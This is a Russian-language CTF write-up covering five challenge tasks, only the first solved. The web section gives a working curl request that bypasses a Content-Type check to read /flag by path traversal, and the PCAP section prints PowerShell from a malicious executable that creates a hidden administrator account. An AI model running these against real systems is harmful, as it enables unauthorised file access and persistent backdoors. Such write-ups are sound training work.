# M*CTF

**Автор:** Куманяев Никита

---
## 1. Задание: **M*CTF — note-saver (Web)**

### 1.1. Вводные данные

Предоставлен веб-сервис для сохранения и чтения заметок; выданы исходники и ссылка на запущенный сервер.
Технологии: Python + Flask, Gunicorn, Nginx + Lua. Флаг сохранялся в `/flag`.

### 1.2. Анализ backend

Во Flask-приложении обработчик `/getNote` формирует путь без нормализации:

```python
filepath = os.path.join('notes', filename)
open(filepath)
```

Это позволяет выполнить path traversal (`../../flag`).

### 1.3. Анализ Nginx + Lua-фильтра

Lua-скрипт валидирует имя файла **только при строгом совпадении заголовка**:

```lua
if ct == "application/json" then
    ...
end
```

Любой Content-Type с параметрами (`application/json; charset=UTF-8`) отключает фильтрацию.

### 1.4. Эксплуатация

```bash
curl -X POST http://host/getNote \
  -H "Content-Type: application/json; charset=UTF-8" \
  -d '{"filename":"../../flag"}'
```

Полученный флаг:

```
MCTF{v4lidate_input_f1lename_n3xt_t1me}
```

### 1.5. Вывод

Успешно выполнена эксплуатация path traversal через обход Lua-фильтра.

![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/mm/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-17%20122458.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/mm/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-17%20122817.jpg?raw=true)
---

## 2. Задание: **Demo Game**

### 2.1. Анализ игровых файлов

Изучена структура ресурсов (JSON/JS). Проверены параметры объектов, в т.ч. босса **Dark Khite**. Изменения параметров не изменили игровой логики — после победы прогресс отсутствует.

### 2.2. Проверка альтернативных сценариев

Пробовались модификации параметров дверей и других элементов. Доступ открыть не удалось, поведение игры не изменилось.

### 2.3. Итог

Флаг в игре отсутствует или недоступен через модификации ресурсов.
**Результат: флаг не найден.**

---

## 3. Задание: **Intern Incident (PCAP анализ)**

### 3.1. Исходные данные

Получен PCAPNG-файл с HTTP-трафиком и бинарными вложениями.

### 3.2. Обнаруженные артефакты

Обнаружены HTTP-запросы к локальному серверу и загрузка PE-файла:

```
GET /README.txt.exe
Server: SimpleHTTP/0.6 Python/3.13.7
```

В трафике присутствуют многочисленные фрагменты ZIP-структур, но без полного архива.

### 3.3. Извлечённые данные

Извлечён PE-файл, содержащий встроенный PowerShell:

```powershell
New-LocalUser -Name 'backdoorAdmin' -Password (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force)
Add-LocalGroupMember -Group 'Administrators' -Member 'backdoorAdmin';
```

Файл явно создаёт административный бэкдор.

### 3.4. Работа с ZIP-фрагментами

Найдены сигнатуры:

* `PK\x03\x04`
* `PK\x01\x02`
* `PK\x05\x06`

Попытка восстановления архива неуспешна: отсутствует central directory, файлы неполные.

### 3.5. Поиск строки `superevilpass`

Поиск по ASCII/UTF-16/HEX/сырым данным — без результатов.
Вероятно, строка находилась в ZIP-архиве, который неполный в PCAP.

### 3.6. Итог

Установлен факт загрузки бэкдорного EXE.
**Результат: флаг не найден.**

![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20144208.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20151751.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20152823.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20171852.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20172759.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20174750.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20195317.jpg?raw=true)
---

## 4. Задание: **Geo_What? (OSINT)**

### 4.1. Анализ строки `ucfwsz`

Строка определена как **geohash**.
Декодирование даёт координаты:

**56.02753 N, 37.47986 E (Московская область, Лобня).**

### 4.2. Проверка местности

Возле координат нашлось предположительно верное место:

* ул. Комиссара Агапова 1, Лобня.

Прямых связей с задачей не обнаружено.
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-17%20114644.jpg?raw=true)

### 4.3. Итог

Геохеш и координаты определены корректно, но флаг отсутствует.
**Результат: флаг не найден.**

---

## 5. Задание: **Reverse Engineering ELF**

### 5.1. Первичный анализ

* ELF 64-bit PIE
* Защиты: Full RELRO, Canary, NX, PIE
* Entry: 0x1440

### 5.2. Статический анализ

`main` вызывает XOR-шифрующую функцию.
Используется строковый ключ `Primordial_Encryption_Key`.
Содержатся зашифрованные данные `argv_0` и `flag_str`.

### 5.3. Шифрование

Многоуровневое XOR-шифрование.
Второй ключ или схема не обнаружены.

### 5.4. Извлечение данных

Найдены зашифрованные строки, но корректной дешифрации получить не удалось.

### 5.5. Проблемы

* Shellcode повреждён или неполон.
* Формат флага отсутствует в чистом виде.
* Дешифровка не дала результата.

### 5.6. Итог

**Флаг не найден.**

![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/reverce/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20203650.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/reverce/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20204215.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/reverce/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20204533.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/reverce/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20210030.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/reverce/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20210610.jpg?raw=true)
![img](https://github.com/OakimPala/CTF/blob/main/%D0%9F%D0%B5%D1%80%D0%B2%D0%BE%D0%B5%20CTF/reverce/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202025-11-16%20212511.jpg?raw=true)


